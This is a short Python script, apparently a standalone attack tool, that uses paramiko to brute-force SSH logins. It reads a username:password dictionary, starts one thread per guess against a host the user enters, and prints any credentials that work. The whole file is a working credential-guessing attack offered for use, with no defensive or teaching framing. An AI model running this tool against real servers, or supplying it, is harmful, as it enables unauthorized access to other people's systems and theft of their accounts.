#!/usr/bin/env python
import paramiko, sys, time, threading

print ("*******************************************")
print ("SSH Brute Force")
print ("*******************************************")

print ("Usage: %s IP /path/to/dictionary" % (str(sys.argv[0])))
print ("Example: %s 10.0.0.1 dict.txt" % (str(sys.argv[0])))
print ("Dictionary should be in user:pass format")



def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print ('[-] %s:%s fail!' % (UserName, Password))
    else:
        print ('[!] %s:%s is CORRECT!' % (UserName, Password))
    ssh.close()
    return

if __name__ == '__main__':
    ip=input('Enter ssh host to brute force: ')
    filename=input('Enter dictionary file path: ')

    fd = open(filename, "r")
    print ('[+] Bruteforcing against %s with dictionary %s' % (ip, filename))
    for line in fd.readlines():
        username, password = line.strip().split(":")
        t = threading.Thread(target=attempt, args=(ip,username,password))
        t.start()
        time.sleep(0.3)


    fd.close()
    sys.exit(0)

